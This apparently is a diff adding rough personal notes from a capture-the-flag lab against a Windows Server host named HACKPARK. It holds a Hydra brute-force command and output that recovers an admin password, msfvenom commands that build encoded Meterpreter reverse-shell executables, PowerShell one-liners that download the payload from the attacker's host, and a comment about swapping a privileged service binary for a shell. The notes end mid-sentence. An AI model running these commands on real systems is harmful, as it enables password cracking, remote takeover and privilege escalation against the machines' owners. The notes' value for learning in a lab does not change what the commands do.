@@ -1,0 +1,41 @@
+└─$ hydra -l admin -P /home/ed/Downloads/rockyou.txt 10.10.41.146 http-form-post "/Account/login.aspx:__VIEWSTATE=92PohiNhuQbY0PXU61Cjm34VDVZ6Vkp50unS9xKz5x9AhW%2F7%2F1NqQjGApl1%2FDUOCzQfb%2FxH%2Bedh%2F6V22cF7IZgmsJNygdj4m22ebtJqSmWmSyOzCASBNjKBRynRYkkl0ZGGgkf%2FnuoiIoYM6YvITSqfxCveCancU5pZh2qZbYxjD3wOj&__EVENTVALIDATION=cEytg7l4oXo3hDSPJmyrzH5MbD1fkZLMdq5LAW%2BplWXD2vg8LTuZhA3AD%2F%2F8XICR9wDPqMkPMJcsCdw2%2BjQT11sQwvoPd0N19JuDjSmuOaSkwDSnU4axu9T42GSjxq0ngvehdTpGD2FFR6fOoIU%2FVJS%2FOkBuUC%2BfQutOgy0eD2%2FNaUkk&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -t 16 -v
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-12 20:40:36
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.41.146:80/Account/login.aspx:__VIEWSTATE=92PohiNhuQbY0PXU61Cjm34VDVZ6Vkp50unS9xKz5x9AhW%2F7%2F1NqQjGApl1%2FDUOCzQfb%2FxH%2Bedh%2F6V22cF7IZgmsJNygdj4m22ebtJqSmWmSyOzCASBNjKBRynRYkkl0ZGGgkf%2FnuoiIoYM6YvITSqfxCveCancU5pZh2qZbYxjD3wOj&__EVENTVALIDATION=cEytg7l4oXo3hDSPJmyrzH5MbD1fkZLMdq5LAW%2BplWXD2vg8LTuZhA3AD%2F%2F8XICR9wDPqMkPMJcsCdw2%2BjQT11sQwvoPd0N19JuDjSmuOaSkwDSnU4axu9T42GSjxq0ngvehdTpGD2FFR6fOoIU%2FVJS%2FOkBuUC%2BfQutOgy0eD2%2FNaUkk&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 506.00 tries/min, 506 tries in 00:01h, 14343893 to do in 472:28h, 16 active
+[VERBOSE] Page redirected to http[s]://10.10.41.146:80/
+[80][http-post-form] host: 10.10.41.146   login: admin   password: 1qaz2wsx
+[STATUS] attack finished for 10.10.41.146 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.87.102 LPORT=8822 -f exe -o shell.exe
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.87.102:8080/shell.exe','shell.exe')"
+
+c:\Windows\Temp>.\shell.exe
+
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.13.87.102:8822 
+[*] Sending stage (177734 bytes) to 10.10.105.222
+[*] Meterpreter session 1 opened (10.13.87.102:8822 -> 10.10.105.222:49312) at 2025-06-13 02:02:49 -0700
+
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter > sysinfo
+Computer        : HACKPARK
+OS              : Windows Server 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+
+
+//the sercie ran as adm privi, and we can explace it with a shell with the same name. to es
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.87.102 LPORT=8822 -f exe -o message.exe
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.87.102:8080/shell.exe','Message.exe')"
+
